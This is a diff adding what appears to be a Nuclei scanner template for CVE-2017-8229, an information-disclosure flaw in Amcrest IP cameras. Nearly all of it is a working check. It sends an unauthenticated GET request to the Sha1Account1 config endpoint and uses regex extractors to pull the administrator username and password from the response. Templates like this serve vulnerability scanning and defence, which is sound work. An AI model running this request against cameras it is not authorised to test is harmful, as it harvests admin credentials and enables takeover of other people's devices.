@@ -1,0 +1,46 @@
+id: cve-2017-8229
+info:
+  name: Amcrest IP Camera Sha1Account1 API Information Disclosure
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    The Amcrest IP Camera is a wireless IP camera that allows unauthenticated
+    attackers to download administrative credentials via the Sha1Account1 API.
+  reference:
+    - https://amcrest.com/
+    - https://poc.shuziguanxing.com/#/publicIssueInfo#issueId=5471
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2019-24194
+  classification:
+    cve-id: CVE-2017-8229
+    cvss-metrics: 5.0
+
+http:
+  - raw:
+      - |
+        GET /current_config/Sha1Account1 HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Encoding: gzip, deflate
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+        Upgrade-Insecure-Requests: 1
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - '\\"Password\\"\s?:\s?\\"(.*?)\\"'
+    extractors:
+      - type: regex
+        part: body
+        name: password
+        regex:
+          - '\\"Password\\"\s?:\s?\\"(.*?)\\"'
+      - type: regex
+        part: body
+        name: username
+        regex:
+          - '\\"Name\\"\s?:\s?\\"(.*?)\\"'
